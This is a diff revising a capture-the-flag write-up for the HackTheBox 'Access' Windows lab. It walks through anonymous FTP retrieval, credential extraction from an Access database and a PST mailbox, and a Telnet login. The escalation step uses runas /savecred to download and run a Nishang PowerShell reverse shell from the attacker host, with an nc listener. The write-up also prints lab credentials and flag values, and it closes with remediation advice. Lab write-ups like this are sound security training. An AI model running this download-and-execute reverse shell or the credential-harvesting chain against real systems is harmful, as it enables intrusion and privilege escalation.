@@ -1,139 +1,160 @@
 # HTB: Access
 
-**Operating System:** Windows
-**Difficulty:** Easy
-**Date of Engagement:** 2025-09-16
-
----
-
 ## Engagement Overview
 
-**Target IP:** 10.10.10.98
-**Local IP:** 10.10.14.3
-
-**Objective:** Enumerate services, recover credentials from backups/mail archives, obtain a low-privilege shell, escalate to Administrator, capture `user.txt` and `root.txt`. Source steps and logs are from your notes and collected artifacts.
+**Target:** Access (HTB)  
+**Box IP:** 10.10.10.98  
+**Date:** 2025-09-16  
+**Attacker Host:** 10.10.14.3  
 
 ---
 
-## Reconnaissance
+### Objectives
+
+- Enumerate services and discover exposed files.  
+- Extract credentials from backups/mail archives.  
+- Gain initial foothold via Telnet.  
+- Escalate to Administrator using misconfigured runas/savecred.  
+- Capture `user.txt` and `root.txt`.  
+
+---
+
+## Service Enumeration
 
 ### Nmap
-```
-sudo nmap -sC -sV -T5 -oA logs/nmap 10.10.10.98
-```
 
-**Relevant output (condensed):**
-
-- 21/tcp open  ftp (Microsoft ftpd) 
-- 23/tcp open  telnet
-- 80/tcp open  http (Microsoft IIS 7.5)
-
-### Web / content discovery
-- Gobuster attempts produced timeouts; web root returned mostly images but FTP/weblisting revealed backup artifacts.
-
-### Discovered artifacts
-- `Backups/backup.mdb`
-- `Engineer/Access Control.pst`
-- `Engineer/Access Control.zip`
-
----
-
-## Initial Access — Extracted Credentials
-
-From `backup.mdb` and exported tables:
-- `engineer` : `access4u@security` (auth_user table)
-- Used to extract `Access Control.pst` from `Access Control.zip`
-
-From `Access Control.pst` (email content):
-- `security` : `4Cc3ssC0ntr0ller`.
-
-*(These credentials were located using `strings`, `mdbtools` and `readpst` .)*
-
----
-
-## Methodology & Tools
-
-**Primary methodology:**  
-
-1. Service enumeration (`nmap`).
-2. Locate and download backup artifacts (MDB, PST/MBX, ZIP).
-3. Extract text from artifacts (`strings`, `mdbtools`, `readpst`) to find credentials.
-4. Authenticate to exposed services (Telnet) to obtain a user shell.
-5. Abuse a discovered `.lnk` referencing `runas /savecred` to run a remote PowerShell payload as Administrator.
-6. Capture flags and document steps.
-
-**Tools:** `nmap`, `gobuster` (attempted), `strings`, `mdbtools` (`mdb-tables`, `mdb-export`), `pst-utils`/`readpst`, `telnet`, `nc` (netcat), `runas`, and a Nishang PowerShell one-liner (hosted on attacker box).
-
----
-
-## Reproducible Steps & Commands
-
-### Recon & artifact download
 ```bash
 sudo nmap -sC -sV -T5 -oA logs/nmap 10.10.10.98
-# after finding web/ftp listings, download:
-# 10.10.10.98/Backups/backup.mdb
-# 10.10.10.98/Engineer/Access Control.zip
 ```
 
-### Artifact inspection & credential harvesting
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+23/tcp open  telnet  Microsoft Telnet
+80/tcp open  http    Microsoft IIS httpd 7.5
+```
+
+### Web/FTP Discovery
+
+- FTP anonymous access allowed.  
+- Retrieved files:  
+  - `Backups/backup.mdb`  
+  - `Engineer/Access Control.zip` → contained `Access Control.pst`.  
+
+```bash
+# Mirror
+wget -m ftp://anonymous:anonymous@10.10.10.98
+```
+
+---
+
+## Initial Access
+
+### Credential Extraction
+
+From `backup.mdb` (auth_user table):  
+
+- `engineer:access4u@security`  
+
 ```bash
 # quick string search
 strings 10.10.10.98/Backups/backup.mdb | grep -C3 access
 
-# mdbtools (export auth_user)
-mdb-tables backup.mdb
-mdb-export backup.mdb auth_user
+admin
+engineer
+access4u@security
 
+# Alternate method mdbtools (export auth_user)
+mdb-tables backup.mdb
+
+# Clean up output to see tables
+mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
+acc_timeseg: 2
+
+# List table data
+mdb-export backup.mdb auth_user
+```
+
+Password unlocked `Access Control.zip` → contained `Access Control.pst`.  
+From PST (email):  
+
+- `security:4Cc3ssC0ntr0ller`  
+
+```bash
 # PST -> MBOX
 7z x "Access Control.zip"
 readpst "Access Control.pst"
 less "Access Control.mbox"
 ```
 
-**Recovered credentials (used):**
-- `engineer:access4u@security` (from `backup.mdb`).
-- `security:4Cc3ssC0ntr0ller` (from PST/mbox email). 
+### Telnet Login
 
-### Use credentials to access Telnet
 ```bash
 telnet 10.10.10.98
 # login: security
 # password: 4Cc3ssC0ntr0ller
-
-# verify shell and user flag
-whoami        # access\security
-type C:\Users\security\Desktop\user.txt
 ```
 
-**User flag captured:** `cb237095f1d0b24079794fa1a2932c1b`. 
+```cmd
+C:\Users\security> whoami
+access\security
 
-### Privilege escalation via runas / saved creds
-- Found a desktop `.lnk` referencing `runas.exe` with `ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"`. The LNK contained the `runas` invocation.
+C:\Users\security> type Desktop\user.txt
+cb237095f1d0b24079794fa1a2932c1b
+```
 
-Example trigger used (hosted Nishang one-liner; attacker listener on port 443):
+---
+
+## Privilege Escalation
+
+### Suspicious LNK
+
+Found `ZKAccess3.5 Security System.lnk` referencing:  
+
+```cmd
+runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
+```
+
+### Abusing Saved Credentials
+
+Hosted Nishang PowerShell one-liner on attacker machine and executed via runas:  
+
 ```powershell
-# on attacker: listener
+# attacker
 nc -lnvp 443
 
-# on target: trigger runas to download+execute Nashang one-liner
+# target
 runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.3/shell.ps1')"
 ```
 
-Reverse shell received as Administrator; `root.txt` retrieved.
+Reverse shell established as Administrator:  
 
-**Root flag captured:** `bc97e19e6897f692e5272f63e763a3a8`. fileciteturn1file0
-
----
-
-## Privilege Escalation — Notes
-- Escalation relied on misconfigured saved-credential usage triggered via a `.lnk` referencing `runas /savecred`. No kernel exploit required.
+```cmd
+PS C:\Users\Administrator\Desktop> type root.txt
+bc97e19e6897f692e5272f63e763a3a8
+```
 
 ---
 
-## Key Takeaways & Remediation
-1. **Protect backup artifacts and mailbox exports** — encrypt backups and restrict access. 
-2. **Remove/replace legacy services** — avoid Telnet/anonymous FTP; use secure alternatives. 
-3. **Avoid saved-credential patterns** — `runas /savecred` and shortcuts referencing privileged accounts must be audited/removed.
-4. **Monitor for remote PowerShell downloads and runas invocations** — host/IDS rules can detect similar abuse.
+## House Cleaning
 
+- Removed hosted `shell.ps1` from attacker box.  
+- No persistence or artifacts left on target.  
+
+---
+
+## Tools Utilized
+
+- `nmap`, `gobuster`  
+- `strings`, `mdbtools`, `readpst`  
+- `telnet`, `nc`  
+- `runas`, `powershell` (Nishang one-liner)  
+
+---
+
+## Key Takeaways
+
+- Backup and PST files exposed sensitive credentials.  
+- Weak service configuration (Telnet, anonymous FTP) enabled easy access.  
+- Misconfigured `runas /savecred` allowed privilege escalation.  
+- Defensive measures: restrict backup access, remove Telnet, audit saved credentials, monitor PowerShell downloads.  
